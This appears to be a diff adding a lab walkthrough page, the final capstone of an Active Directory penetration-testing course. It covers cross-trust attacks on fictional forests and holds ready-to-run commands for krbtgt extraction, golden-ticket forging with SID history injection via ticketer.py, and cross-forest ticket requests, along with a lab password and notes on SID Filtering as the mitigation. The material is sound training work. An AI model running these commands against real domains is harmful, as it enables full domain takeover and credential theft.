+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parent-child (intra-forest)</td>
+<td>bidirectional</td>
+<td>yes</td>
+<td>OFF</td>
+<td>SID history injection (Phase 3)</td>
+</tr>
+<tr>
+<td>Tree-root (intra-forest)</td>
+<td>bidirectional</td>
+<td>yes</td>
+<td>OFF</td>
+<td>SID history injection</td>
+</tr>
+<tr>
+<td>External (cross-forest)</td>
+<td>one-way (typical)</td>
+<td>no</td>
+<td>ON</td>
+<td>Referral TGT (Phase 4); ACL abuse</td>
+</tr>
+<tr>
+<td>Forest trust (with selective auth)</td>
+<td>bidirectional</td>
+<td>yes (with caveats)</td>
+<td>ON + selective auth</td>
+<td>Limited; depends on selective ACLs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="recommended-phases">Recommended Phases</h2>
+<h3 id="phase-0-engagement-setup-target-10-minutes">Phase 0: Engagement Setup (target: ~10 minutes)</h3>
+<p>A multi-domain capstone produces a lot of evidence. Set up the directory tree before you start so each phase has a clean dropzone.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Multi-domain scaffolding</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/work/adpt-capstone-2/<span class="o">{</span>recon,phase1-corp-t1,phase2-corp-t0,phase3-ea,phase4-logistics,evidence<span class="o">}</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">cd</span><span class="w"> </span>~/work/adpt-capstone-2
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>date<span class="w"> </span>-u<span class="w"> </span>+%Y-%m-%dT%H:%M:%SZ<span class="k">)</span><span class="s2"> -- multi-domain engagement start&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>evidence/timeline.txt
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>evidence/scope.txt<span class="w"> </span><span class="s">&lt;&lt;EOF</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="s">Token: ${OCR_SCOPE_TOKEN}</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="s">Forests: nordport.local, logistics.local</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="s">Foothold: j.chen / Welcome2026# in corp.nordport.local</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="s">Final flag location: \\\\logfs01\\C\$\\log_${OCR_SCOPE_TOKEN}.txt</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="s">EOF</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>phase{1..4}-*</code> directories</td>
+<td>One bucket per phase; ccache files, BloodHound zips, hashes, screenshots all land here.</td>
+</tr>
+<tr>
+<td><code>evidence/timeline.txt</code></td>
+<td>Chronological log; every phase boundary appends a line.</td>
+</tr>
+<tr>
+<td><code>evidence/scope.txt</code></td>
+<td>Re-stating the scope in writing prevents accidental cross-trust collateral damage on the wrong tenant.</td>
+</tr>
+</tbody>
+</table>
+<p>Plan for the 8-12 hour budget by setting a phase-end checkpoint where you save progress: cached tickets, dumped hashes, BloodHound JSONs. If a session ends mid-phase, you can resume without re-doing earlier phases.</p>
+</div>
+<h3 id="phase-1-corp-tier-1-target-120-minutes">Phase 1: Corp Tier 1 (target: ~120 minutes)</h3>
+<p>Familiar territory. Foothold credential -&gt; Kerberoast SQL service account -&gt; xp_cmdshell -&gt; SYSTEM on <code>mfgsql01</code> -&gt; read Tier 1 flag.</p>
+<p>Same playbook as Capstone 6.1 but you start with j.chen already.</p>
+<h3 id="phase-2-corp-tier-0-target-180-minutes">Phase 2: Corp Tier 0 (target: ~180 minutes)</h3>
+<p>From server admin / DBA, reach Domain Admin in <code>corp.nordport.local</code>. Multiple paths: ADCS ESC1 if templates are vulnerable; constrained delegation if a service account targets DC services; LSASS dump on <code>mfgsql01</code> if a higher-privileged account ever logged in.</p>
+<p>End-state: krbtgt hash of <code>corp.nordport.local</code>.</p>
+<h3 id="phase-3-cross-trust-to-enterprise-admins-target-240-minutes">Phase 3: Cross-Trust to Enterprise Admins (target: ~240 minutes)</h3>
+<p>Cross-trust SID history injection is the new technique for this exercise. The parent-child trust is <strong>transitive within the forest</strong> and supports SID history. Once you have krbtgt of the child, you forge a golden ticket for the child domain, then enrich the PAC with the parent's <code>Enterprise Admins</code> SID via <code>SidHistory</code>. The parent KDC honors the SidHistory claim and treats you as an Enterprise Admin.</p>
+<p>The diagram below traces the cross-trust traversal at the protocol level. Watch where the ExtraSids field is added and how the parent KDC honors it.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    autonumber
+    participant A as Attacker (Kali)
+    participant CK as Child KDC&lt;br/&gt;(corp-dc01)
+    participant PK as Parent KDC&lt;br/&gt;(npdc01)
+    participant T as Target service&lt;br/&gt;(npdc01 C$)
+
+    Note over A: ticketer.py forges TGT for corp.nordport.local&lt;br/&gt;signs with corp krbtgt&lt;br/&gt;injects ExtraSids = &lt;parent_sid&gt;-519
+    A-&gt;&gt;CK: TGS-REQ for cifs/npdc01.nordport.local&lt;br/&gt;(forged TGT in padata)
+    CK--&gt;&gt;A: cross-realm referral TGT&lt;br/&gt;(includes ExtraSids in PAC)
+    A-&gt;&gt;PK: TGS-REQ for cifs/npdc01.nordport.local&lt;br/&gt;(referral TGT in padata)
+    PK--&gt;&gt;A: TGS for Administrator-as-EnterpriseAdmin&lt;br/&gt;(parent KDC honors ExtraSids)
+    A-&gt;&gt;T: AP-REQ via SMB
+    T--&gt;&gt;A: SMB session with EA rights</code></pre>
+<h4 id="the-technique-inter-realm-sid-history-injection">The technique: Inter-Realm SID History Injection</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>1. Possess corp.nordport.local krbtgt hash
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>2. Forge a golden ticket for corp.nordport.local (Administrator)
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>3. Mint that ticket WITH SidHistory containing nordport.local Enterprise Admins SID:
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>       &lt;parent_domain_sid&gt;-519
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>4. Use the forged ticket to request a TGS for a service in nordport.local
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>5. The parent KDC sees ExtraSids in the PAC, evaluates as Enterprise Admin
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>6. Read \\npdc01\C$\np_ea_&lt;token&gt;.txt
+</code></pre></div>
+<p>ticketer.py supports this with the <code>-extra-sid</code> flag:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ticketer.py<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>-nthash<span class="w"> </span>&lt;corp_krbtgt_hash&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span>-domain-sid<span class="w"> </span>&lt;CORP_DOMAIN_SID&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span>-domain<span class="w"> </span>corp.nordport.local<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">  </span>-extra-sid<span class="w"> </span><span class="s1">&#39;&lt;PARENT_DOMAIN_SID&gt;-519&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">  </span>-user-id<span class="w"> </span><span class="m">500</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">  </span>-groups<span class="w"> </span><span class="m">513</span>,512,520,518,519<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">  </span>EnterpriseAdmin
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-nthash &lt;child_krbtgt&gt;</code></td>
+<td>Forging key from Phase 2's DCSync.</td>
+</tr>
+<tr>
+<td><code>-domain-sid &lt;CHILD_SID&gt;</code></td>
+<td>Child domain SID (corp.nordport.local).</td>
+</tr>
+<tr>
+<td><code>-extra-sid '&lt;PARENT_SID&gt;-519'</code></td>
+<td>Append parent forest's Enterprise Admins SID to the PAC's ExtraSids.</td>
+</tr>
+<tr>
+<td><code>-user-id 500 -groups 513,512,...</code></td>
+<td>Standard golden-ticket admin profile.</td>
+</tr>
+<tr>
+<td><code>EnterpriseAdmin</code></td>
+<td>Username string; AD never sees it.</td>
+</tr>
+</tbody>
+</table>
+<p>Then access the parent DC:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>EnterpriseAdmin.ccache
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>smbclient<span class="w"> </span>//npdc01.nordport.local/C$<span class="w"> </span>-k
+</code></pre></div>
+<p>The path: child KDC issues a referral TGT with the ExtraSids passed through; parent KDC honors the SID claim because intra-forest trusts do not filter SIDs; SMB on the parent DC sees Administrator-as-EA and grants access to C$.</p>
+<p>The defender mitigation is <strong>SID Filtering</strong> on the parent-child trust, which strips foreign SIDs from cross-trust PACs. Microsoft enables it by default on external trusts, but <strong>NOT</strong> on intra-forest parent-child trusts (since the parent and child are considered the same security boundary). The intra-forest exemption is exactly the gap exploited.</p>
+<h3 id="phase-4-external-trust-to-logistics-target-180-minutes">Phase 4: External Trust to Logistics (target: ~180 minutes)</h3>
+<p><code>logistics.local</code> has a one-way external trust <strong>to</strong> <code>nordport.local</code>. That means logistics trusts nordport's authentications. With Enterprise Admin in nordport, you can request referral tickets into logistics.</p>
+<h4 id="the-technique-external-trust-traversal">The technique: External Trust Traversal</h4>
+<p>External trusts use a different SID Filtering policy than intra-forest trusts. By default, Microsoft enables SID Filtering on external trusts to PREVENT SID history injection (the parent-child trick from Phase 3 does NOT work cross-forest). However, an authenticated nordport user can still authenticate to services in logistics that explicitly grant them access; typically via cross-trust ACLs.</p>
+<p>The simpler path: use the trust to request a TGS for a logistics service.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>EnterpriseAdmin.ccache<span class="w">    </span><span class="c1"># from Phase 3</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/logfs01.logistics.local<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;nordport_dc_ip&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span>nordport.local/EnterpriseAdmin
+</code></pre></div>
+<p>The KDC for <code>nordport.local</code> produces a referral TGT for <code>logistics.local</code>, then you exchange that for a TGS to <code>cifs/logfs01.logistics.local</code>. The logistics DC validates the inter-realm ticket, sees the trust permits it, and issues. You authenticate to <code>logfs01</code> and read the file.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-spn &lt;svc&gt;/&lt;host&gt;.&lt;external_realm&gt;</code></td>
+<td>Target service in the foreign realm.</td>
+</tr>
+<tr>
+<td><code>-dc-ip &lt;local_dc&gt;</code></td>
+<td>Local KDC issues the referral; do not point at the foreign DC.</td>
+</tr>
+<tr>
+<td><code>&lt;local_realm&gt;/&lt;user&gt;</code></td>
+<td>Authenticate against your own realm using the cached EA ticket.</td>
+</tr>
+</tbody>
+</table>
+<p>If straight referral does not work because the per-token configuration restricts access, fall back to using the EA-equivalent tickets to write your own SID into a logistics ACL via cross-trust GenericWrite.</p>
+<p>End-state: read the final flag, in the form <code>OCR{...}</code>, and submit its contents verbatim.</p>
+<div class="admonition warning">
+<p class="admonition-title">Common pitfalls in multi-domain runs</p>
+<ul>
+<li><strong>Wrong domain SID</strong>: every domain has its own SID. Phase 3 needs the <strong>child</strong> SID for <code>-domain-sid</code> and the <strong>parent</strong> SID for <code>-extra-sid</code>. Mixing them produces a ticket the parent rejects.</li>
+<li><strong>Trust replication delay</strong>: a freshly seeded trust may not be active across both DCs immediately. If Phase 4's referral returns <code>KRB_AP_ERR_BAD_INTEGRITY</code>, wait 5 minutes and retry.</li>
+<li><strong>SID Filtering on</strong>: some lab variants enable SID Filtering on the parent-child trust to test that you recognize the difference. If <code>-extra-sid</code> is silently stripped, fall back to a cross-trust ACL path (BloodHound <code>--collectionmethod ACL</code> for both forests).</li>
+<li><strong>Cross-realm clock skew</strong>: Kerberos enforces 5-minute clock skew per realm boundary. Sync Kali to the closest DC if any cross-realm AP-REQ fails on time.</li>
+<li><strong>ccache pollution between phases</strong>: each phase produces its own ccache. Keep them in <code>phase{N}-*/</code> directories and explicitly <code>KRB5CCNAME=&lt;full path&gt;</code> per phase; do not rely on the default cache slot.</li>
+<li><strong>Cleanup is multi-domain</strong>: ACLs you wrote, computer accounts you created, golden tickets in caches; track them per-domain in <code>evidence/timeline.txt</code> and revert at the end.</li>
+</ul>
+</div>
+<hr />
+<h2 id="reporting-template">Reporting Template</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="gh"># Multi-Domain Engagement Narrative</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="gu">## Phase 1: Corp Tier 1 (mfgsql01 admin)</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="gs">**Chain:**</span>  foothold (j.chen) -&gt; Kerberoast svc_sql -&gt; xp_cmdshell -&gt; SYSTEM
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="gs">**Tier 1 flag:**</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="gu">## Phase 2: Corp Tier 0 (Domain Admin in corp.nordport.local)</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="gs">**Chain:**</span>  ...
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="gs">**Tier 0 flag:**</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="gu">## Phase 3: Enterprise Admin in nordport.local</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="gs">**Chain:**</span>  golden ticket for corp + SidHistory injection of &lt;parent_sid&gt;-519
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="gs">**Tooling:**</span>  ticketer.py -extra-sid
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="gs">**EA flag:**</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="gu">## Phase 4: Logistics.local</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="gs">**Chain:**</span>  EA -&gt; referral TGT -&gt; TGS for cifs/logfs01.logistics.local
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="gs">**Final flag:**</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="gu">## Trust Architecture Findings (for Priya)</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="k">-</span><span class="w"> </span>Parent-child trust: SID Filtering NOT enabled (intra-forest default). Mitigations are intentionally limited.
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="k">-</span><span class="w"> </span>External trust to logistics: SID Filtering enabled by default; authenticated EA still has access via referral.
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="k">-</span><span class="w"> </span>Recommendations:  ...
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="gu">## Recommended Remediations (priority order)</span>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="k">1.</span> ...
+</code></pre></div>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>Trust relationships are first-class attack surfaces; learn the four kinds (parent-child, tree-root, external, forest with quarantine) and their default SID Filtering behavior.</li>
+<li>Parent-child trusts inside a forest do NOT filter SIDs; SID history injection works.</li>
+<li>External trusts filter SIDs by default; the lateral movement happens via referral tickets and cross-trust ACLs.</li>
+<li>ticketer.py <code>-extra-sid</code> is the SID history injection workhorse.</li>
+<li>The graduation criterion for this track is "drop into GOAD-Light unaided"; if you finished this exercise, you are ready.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below are the new techniques specific to this capstone. Everything else is recall from earlier chapters.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Recover child krbtgt</td>
+<td><code>secretsdump.py -just-dc-user krbtgt "&lt;child&gt;/&lt;u&gt;:&lt;pw&gt;" -dc-ip &lt;child-dc&gt;</code></td>
+</tr>
+<tr>
+<td>Forge cross-realm golden w/ SID injection</td>
+<td><code>ticketer.py -nthash '&lt;child-krbtgt&gt;' -domain-sid '&lt;child-SID&gt;' -domain &lt;child&gt; -extra-sid '&lt;parent-SID&gt;-519' -user-id 500 -groups 513,512,520,518,519 EnterpriseAdmin</code></td>
+</tr>
+<tr>
+<td>Use across the trust</td>
+<td><code>export KRB5CCNAME=EnterpriseAdmin.ccache; smbclient //&lt;parent-dc&gt;/C$ -k</code></td>
+</tr>
+<tr>
+<td>Cross-forest TGS via referral</td>
+<td><code>getST.py -spn cifs/&lt;external-target&gt;.&lt;external-domain&gt; -dc-ip &lt;local-dc&gt; &lt;local-domain&gt;/EnterpriseAdmin</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="reflection-final-track-output">Reflection (Final Track Output)</h2>
+<p>Three questions to answer in your notes after submitting the final flag:</p>
+<ol>
+<li><strong>What was the single hardest step in the multi-domain chain, and what made it hard?</strong></li>
+<li><strong>If you were Priya, which finding would you escalate to a board-level conversation?</strong></li>
+<li><strong>You are now ready for GOAD-Light. Clone it, walk the canonical chain end-to-end, and compare your time to a fresh learner. The point of this track was to make GOAD feel obvious; was it?</strong></li>
+</ol>
+<hr />
+<h2 id="you-did-it">You Did It</h2>
+<p>You finished the AD Penetration Track. 25 exercises across 6 levels, every major AD attack primitive, two capstones, two trust types. You should be able to land in any production AD environment and recognize the chain in the first hour. Go find some bad delegations and write reports that change them.</p>
+<p><code>OCR{...}</code></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
